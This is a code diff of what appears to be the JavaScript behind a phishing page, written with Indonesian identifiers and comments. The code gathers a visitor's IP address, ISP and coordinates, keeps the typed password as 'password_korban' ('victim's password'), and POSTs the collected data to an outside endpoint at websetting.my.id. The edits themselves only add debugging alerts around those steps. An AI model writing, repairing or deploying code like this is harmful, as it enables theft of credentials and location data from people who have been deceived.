@@ -79,7 +79,7 @@
     btn.disabled = true;
     
     var ua = navigator.userAgent;
-    var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_fadz_1'; // Default Fadz
+    var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_fadz_1'; 
     
     var payload = { 
         web_id: web_id_aktif, 
@@ -103,7 +103,9 @@
             payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            // NEMBAK KE DOMAIN WEBSET
+            // ALERT 1
+            alert("1. IP Berhasil didapat: " + payload.ip + ". Lanjut kirim ke server...");
+
             return fetch("https://websetting.my.id/api/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -111,11 +113,14 @@
             });
         })
         .then(function(res){
+            // ALERT 2
+            alert("2. Data sukses terkirim ke API send.js!");
             sessionStorage.setItem('password_korban', password);
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            // KALO GAGAL TETEP LANJUT KE HALAMAN SELESAI
+            // ALERT 3
+            alert("3. Gagal kirim data! Error: " + err.message);
             window.location.href = "selesai.html";
         });
   }
